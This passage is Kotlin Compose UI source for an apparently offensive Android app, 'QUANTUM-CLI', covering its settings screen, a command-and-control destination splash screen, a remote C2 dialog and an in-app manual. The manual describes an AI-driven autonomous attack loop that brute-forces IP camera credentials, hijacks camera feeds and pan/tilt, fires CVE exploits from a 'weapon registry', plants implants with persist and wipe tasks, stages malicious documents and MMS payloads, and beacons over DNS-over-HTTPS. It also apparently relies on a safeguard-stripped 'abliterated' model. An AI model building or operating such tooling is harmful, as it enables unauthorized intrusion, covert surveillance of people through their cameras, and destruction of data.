        Text("Updates", style = QuantumTypography.titleSmall, color = SoftCyan)
        Spacer(Modifier.height(4.dp))
        Text(
            "installed: v${com.projectzerodays.quantumcli.BuildConfig.VERSION_NAME} " +
                "(${com.projectzerodays.quantumcli.BuildConfig.FLAVOR})",
            style = QuantumTypography.bodySmall,
            color = Muted,
        )
        Spacer(Modifier.height(8.dp))
        Button(
            onClick = {
                checking = true
                scope.launch {
                    updateResult = withContext(Dispatchers.IO) { UpdateChecker.check() }
                    updateResult?.let { C2State.audit("C2", it.headline()) }
                    checking = false
                }
            },
            enabled = !checking,
        ) { Text(if (checking) "CHECKING…" else "CHECK FOR UPDATES") }
        updateResult?.let { r ->
            Column(Modifier.fillMaxWidth().quantumPanel().padding(12.dp)) {
                Text(r.headline(), style = QuantumTypography.bodyMedium, color = Softest)
                r.notes?.let {
                    Text(
                        it,
                        style = QuantumTypography.bodySmall,
                        color = Muted,
                        modifier = Modifier.padding(top = 6.dp),
                    )
                }
                r.url?.let {
                    Text(
                        "Open release page →",
                        style = QuantumTypography.bodySmall,
                        color = Cyan,
                        modifier = Modifier
                            .padding(top = 6.dp)
                            .clickable { openUrl(ctx, it) },
                    )
                }
            }
        }

        HorizontalDivider(color = Cyan.copy(0.18f), modifier = Modifier.padding(vertical = 12.dp))

        // ---- wizard / manual --------------------------------------------------
        Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            Button(onClick = actions.openWizard, modifier = Modifier.weight(1f)) {
                Text("SETUP WIZARD")
            }
            OutlinedButton(onClick = actions.openManual, modifier = Modifier.weight(1f)) {
                Text("APP MANUAL")
            }
        }
        Spacer(Modifier.height(8.dp))

        // ---- save all settings -------------------------------------------------
        Button(
            onClick = {
                QuantSettings.update {
                    it.copy(
                        c2Port = c2Port.toIntOrNull() ?: it.c2Port,
                        apiUrl = apiUrl.trim(),
                        apiKey = apiKey.trim(),
                        aiApiKey = apiKey.trim(),
                        model = model.trim(),
                        overlordCycles = cyclesText.toIntOrNull() ?: it.overlordCycles,
                        overlordScope = scopeText.trim(),
                        c2Domain = domainText.trim(),
                    )
                }
                C2State.audit(
                    "SETTINGS",
                    "all settings saved (port=${c2Port.toIntOrNull() ?: settings.c2Port}, " +
                        "provider=${settings.aiProvider}, model=${model.trim()})"
                )
            },
            modifier = Modifier.fillMaxWidth(),
        ) { Text("SAVE ALL SETTINGS") }

        Spacer(Modifier.height(16.dp))
    }

    if (showRemoteDialog) {
        RemoteConnectDialog(
            initialHost = remoteHost,
            onDismiss = { showRemoteDialog = false },
            onConnect = { host ->
                QuantSettings.update {
                    it.copy(
                        c2Mode = "remote_connect",
                        c2RemoteHost = host.trim(),
                    )
                }
                remoteHost = host.trim()
                C2State.audit("C2", "C2 destination switched to remote-connect: $host")
                openUrl(ctx, "${host.trim().removeSuffix("/")}/dash")
            },
        )
    }
}

@Composable
private fun SettingSwitch(label: String, checked: Boolean, onToggle: () -> Unit) {
    Row(verticalAlignment = Alignment.CenterVertically) {
        Text(
            label,
            color = Softest,
            style = QuantumTypography.bodyMedium,
            modifier = Modifier.weight(1f),
        )
        Switch(checked = checked, onCheckedChange = { onToggle() })
    }
}

// ---------------------------------------------------------------------------
// App manual — how-to + troubleshooting
// ---------------------------------------------------------------------------

@Composable
fun ManualDialog(onDismiss: () -> Unit) {
    AlertDialog(
        onDismissRequest = onDismiss,
        containerColor = Panel,
        title = { Text("QUANTUM-CLI manual", color = Cyan) },
        text = {
            Column(
                Modifier
                    .verticalScroll(rememberScrollState())
                    .fillMaxWidth(),
            ) {
                ManualSection("HOW TO") {
                    M("0. C2 Destination Gate — on first launch the app presents a 3-second choice between Self-Host C2 (starts the embedded NanoHTTPD C2 server on-device and shows the native dashboard) and Remote-Connect C2 (point at an externally-hosted QUANTUMDASH endpoint). Self-Host is auto-selected after the countdown elapses. Change the mode later in Settings → C2 destination.")
M("1. Setup — sidebar → Setup wizard. Choose Abliteration.ai (paste your key), Local model (auto-downloads the on-device fallback once), or Skip for manual-only mode.")
                    M("2. Auto Run — Dashboard → AUTO RUN. Unlocks once AI is configured. Camera-only restricts the act whitelist to camera operations; the interval slider controls the decision cadence; aggression (balanced / aggressive / patient) and cycles (0 = infinite) tune the loop; a CIDR scope limits targets (blank = local /24).")
                    M("3. Manual ops — every page has controls. Implants: queue PERSIST / WIPE tasks per host. Cameras: DISCOVER + BRUTE, per-camera SNAPSHOT and the PTZ nudge row (◀ ▲ ▼ ▶ ■) driving the vendor PTZ channel. Exploits: FINGERPRINT, ZERO-CHECK, FIRE, plus the weapon registry — a tier-colored list (V3_HIGH red, V3_MED green, legacy cyan) where tapping a row arms its CVE into the FIRE field. Loot: triage header (items / hosts / vault size), SEAL ALL / UNSEAL ALL bulk ops, per-item UNSEAL / DELETE.")
                    M("4. Chat — natural language ('scan for cameras', 'start background job', 'kill-switch') or bare /ai commands ('run task fingerprint 10.0.0.5'). Locked until AI is configured.")
                    M("5. Kill switch — Dashboard → ARM queues wipe/die tasks on every implant and halts the overlord. DISARM stops further wipes.")
                    M("6. Network — device interfaces (IPv4/IPv6/MAC), VPN and proxy status, gateway, public egress with location, and DNS resolution with per-address location. Private addresses are never sent to external geo services.")
                    M("7. Web C2 — while the server runs, a browser dashboard is served at http://<device-ip>:<port>/dash.")
                    M("8. Updates — Settings → CHECK FOR UPDATES compares your build with the latest GitHub release and flags patch/minor bumps as safe.")
                }
                Spacer(Modifier.height(8.dp))
                ManualSection("AUTONOMY + INFRA SURFACES") {
                    M("9. Dashboard quick ops — second row: FLASHFILL (disk-pressure fill), EMOJISMS (emoji-MMS payload, prompted for text), MACRESET (MAC re-roll), MALDOC (MSHTML maldoc staged at the device IP).")
                    M("10. Federation / FoxAcid — Dashboard chips. FEDERATION queries the peer-mesh status; FOXACID START / STOP toggles the FoxAcid landing server (status prints under the buttons and in the console).")
                    M("11. GhostDNS / DoH C2 — /ai API + chat surfaces: 'ghostdns' with {host, domain} points a host at the operator domain configured in Settings → C2 operator domain; 'dohc2' with {action: start|stop, port?} runs beaconing through DNS-over-HTTPS.")
                    M("12. PTZ — the nudge row speaks camera pan/tilt directly (left / up / down / right / stop); results land in the console under the CAM tag. Nudges without known credentials report an honest failure.")
                    M("13. Camera thumbnails — every camera card shows a real JPEG still as a 2×2-inch tile with a centered play button (cyan = CONTROLLED, dim = default-cred path). Tap to open the full-screen feed preview: live stills auto-refreshing every 3s, LIVE toggle, manual refresh, frame timestamps, and an honest NO SIGNAL state. Thumbnails re-fetch after PTZ nudges.")
                    M("14. Tasks — the Tasks page manages workflows: named chains of /ai commands with ${'$'}{var} templating (a 'scan' step auto-fills first_host / first_cam for the next steps). Create, edit, delete, and run chains; a run stops at the first failed step and shows per-step results.")
                    M("15. Floating chat — the cyan bubble in the bottom-right corner opens the popup AI chat from any page; it hides on the Chat page itself.")
                    M("16. Zenmap controls — Network → Host scan: target CIDR or single host, port spec with ranges ('22,80,443,1000-2000'), and nmap timing templates T0 paranoid through T5 insane (they map to sweep concurrency and probe timeout). Camera/ONVIF ports light up green in the results.")
                    M("17. Chat attachments — the paperclip opens the system file picker (any file) or photo/video picker; the image icon goes straight to photos. Picked files are copied into files/attachments; small text files are inlined into the message so every AI mode can read them. The download icon on each message now opens a save-as dialog — pick any location, name, and extension.")
                }
                Spacer(Modifier.height(8.dp))
                ManualSection("TROUBLESHOOTING") {
                    M("Chat locked → finish the Setup wizard; verify the key in Settings, or wait for the local model download (progress shows in the Dashboard console).")
                    M("Auto Run greyed → no AI configured. Open the wizard and pick cloud or local.")
                    M("Camera sweep empty → device and cameras must share the LAN (/24); adjust the CIDR field. WS-Discovery needs multicast-enabled Wi-Fi.")
                    M("Snapshot fails → the vendor is unrecognized; run BRUTE CREDS first to obtain credentials, then retry.")
                    M("FIRE returns an error → verify the CVE id exists in the ZERO_DAY registry and the target passes ZERO-CHECK.")
                    M("Update check fails → the network or VPN blocks api.github.com; retry from an unrestricted network.")
                    M("Unseal fails → logs/.lootkey is immutable by design; if it was deleted, previously sealed loot cannot be decrypted.")
                    M("Kill-switch armed by accident → press DISARM. Already-queued wipe tasks on implants cannot be recalled.")
                    M("Model download stalls → it retries on next app open; check free storage (needs ~1.5 GB) and retry from Settings.")
                }
            }
        },
        confirmButton = { Button(onClick = onDismiss) { Text("Close") } },
    )
}

@Composable
private fun ManualSection(title: String, content: @Composable () -> Unit) {
    Text(title, style = QuantumTypography.titleSmall, color = Cyan)
    Spacer(Modifier.height(6.dp))
    content()
}

@Composable
private fun M(text: String) {
    Text(
        text,
        style = QuantumTypography.bodySmall,
        color = Softest,
        modifier = Modifier.padding(vertical = 3.dp),
    )
}

// ---------------------------------------------------------------------------
// C2 Destination Gate — first-launch splash: Self-Host vs Remote-Connect C2
// ---------------------------------------------------------------------------

/**
 * Full-screen startup gate with a 3-second countdown. Presents two buttons at
 * the bottom:
 *
 *  • Self-Host C2  — starts the on-device embedded C2 server (NanoHTTPD /dash)
 *    and lands the user on the native dashboard.
 *  • Remote-Connect C2 — opens a dialog for the operator to point at an
 *    externally-hosted QUANTUMDASH endpoint.
 *
 * If nothing is tapped within 3 seconds, Self-Host is auto-selected (the
 * operator can see the countdown tick down live).
 */
@Composable
fun C2DestinationGate(
    onSelfHost: () -> Unit,
    onRemoteConnect: () -> Unit,
    onSkip: () -> Unit,
) {
    var countdown by remember { mutableStateOf(3) }

    // Countdown coroutine — ticks once per second, then fires the default.
    LaunchedEffect(Unit) {
        while (countdown > 0) {
            delay(1000)
            countdown--
        }
        // Countdown hit zero — auto-select Self-Host (unless already dismissed).
        onSelfHost()
    }

    // If the user taps either button we kill the countdown so it doesn't fire.
    fun cancelAutoSelect() {
        countdown = -1
    }

    Surface(
        modifier = Modifier.fillMaxSize(),
        color = QuantumBg1,
    ) {
        Box(
            Modifier
                .fillMaxSize()
                .quantumBackground(),
            contentAlignment = Alignment.Center,
        ) {
            Column(
                Modifier
                    .fillMaxWidth()
                    .padding(horizontal = 24.dp),
                horizontalAlignment = Alignment.CenterHorizontally,
            ) {
                // ---- branding ----
                Text(
                    "QUANTUM-CLI",
                    style = QuantumTypography.displaySmall,
                    color = Cyan,
                )
                Spacer(Modifier.height(8.dp))
                Text(
                    "C2 Destination",
                    style = QuantumTypography.headlineSmall,
                    color = SoftCyan,
                )
                Spacer(Modifier.height(16.dp))

                // ---- alert: default selection warning ----
                if (countdown > 0) {
                    Text(
                        "Self-Host C2 will be selected automatically in $countdown second(s)",
                        style = QuantumTypography.bodyMedium,
                        color = Warn,
                        textAlign = TextAlign.Center,
                        modifier = Modifier
                            .fillMaxWidth()
                            .quantumPanel()
                            .padding(12.dp),
                    )
                } else {
                    Text(
                        "Auto-selecting Self-Host C2…",
                        style = QuantumTypography.bodyMedium,
                        color = Ok,
                        textAlign = TextAlign.Center,
                        modifier = Modifier
                            .fillMaxWidth()
                            .quantumPanel()
                            .padding(12.dp),
                    )
                }
                Spacer(Modifier.height(16.dp))

                // ---- countdown number pulse ----
                Text(
                    if (countdown > 0) countdown.toString() else "GO",
                    style = QuantumTypography.displayMedium,
                    color = when {
                        countdown <= 0 -> Ok
                        countdown <= 1 -> Danger
                        else -> Warn
                    },
                )
                Spacer(Modifier.height(8.dp))
                Text(
                    "self-hosting the embedded C2 and opening the native dashboard",
                    style = QuantumTypography.bodySmall,
                    color = Muted,
                    textAlign = TextAlign.Center,
                )
            }

            // ---- two buttons at the bottom ----
            Column(
                Modifier.align(Alignment.BottomCenter),
                verticalArrangement = Arrangement.spacedBy(12.dp),
            ) {
                Button(
                    onClick = { cancelAutoSelect(); onSelfHost() },
                    modifier = Modifier.fillMaxWidth(0.9f),
                    colors = ButtonDefaults.buttonColors(
                        containerColor = Cyan.copy(alpha = 0.18f),
                        contentColor = Cyan,
                    ),
                ) {
                    Icon(
                        Icons.Outlined.Dashboard,
                        contentDescription = null,
                        tint = Cyan,
                    )
                    Spacer(Modifier.width(8.dp))
                    Text("SELF-HOST C2", style = QuantumTypography.labelLarge)
                }
                OutlinedButton(
                    onClick = { cancelAutoSelect(); onRemoteConnect() },
                    modifier = Modifier.fillMaxWidth(0.9f),
                ) {
                    Icon(
                        Icons.Outlined.Wifi,
                        contentDescription = null,
                        tint = SoftCyan,
                    )
                    Spacer(Modifier.width(8.dp))
                    Text(
                        "REMOTE-CONNECT C2",
                        style = QuantumTypography.labelLarge,
                        color = SoftCyan,
                    )
                }
                Spacer(Modifier.height(8.dp))
                TextButton(onClick = { cancelAutoSelect(); onSkip() }) {
                    Text(
                        "Skip — go straight to dashboard",
                        style = QuantumTypography.bodySmall,
                        color = Muted,
                    )
                }
            }
        }
    }
}

/**
 * Dialog shown when the operator picks Remote-Connect C2 — asks for the
 * remote C2 base URL (e.g. http://10.0.0.5:8443) and hands it back.
 */
@Composable
fun RemoteConnectDialog(
    initialHost: String,
    onDismiss: () -> Unit,
    onConnect: (String) -> Unit,
) {
    var host by rememberSaveable { mutableStateOf(initialHost.ifBlank { "http://<host>:8443" }) }

    AlertDialog(
        onDismissRequest = onDismiss,
        containerColor = Panel,
        title = { Text("Remote C2 host", color = Cyan) },
        text = {
            Column {
                Text(
                    "Enter the base URL of the externally-hosted QUANTUMDASH\n" +
                        "C2 server (e.g. http://10.0.0.5:8443). The web panel\n" +
                        "will open at <host>/dash and the native dashboard\n" +
                        "controls remain fully available.",
                    style = QuantumTypography.bodySmall,
                    color = Muted,
                )
                Spacer(Modifier.height(10.dp))
                OutlinedTextField(
                    value = host,
                    onValueChange = { host = it },
                    label = { Text("C2 base URL") },
                    singleLine = true,
                    modifier = Modifier.fillMaxWidth(),
                )
            }
        },
        confirmButton = {
            Button(
                onClick = {
                    val h = host.trim()
                    if (h.isNotBlank()) {
                        onConnect(h)
                    }
                },
                enabled = host.trim().isNotBlank(),
            ) { Text("CONNECT") }
        },
        dismissButton = { TextButton(onClick = onDismiss) { Text("Cancel") } },
    )
}

// ---------------------------------------------------------------------------
// Shared widgets
// ---------------------------------------------------------------------------

@Composable
fun StatusCard(label: String, value: String) {
    Column(
        Modifier
            .fillMaxWidth()
            .quantumPanel()
            .padding(12.dp),
    ) {
        Text(label, style = QuantumTypography.labelMedium, color = SoftCyan)
        Text(value, style = QuantumTypography.bodyMedium, color = Softest)
    }
}
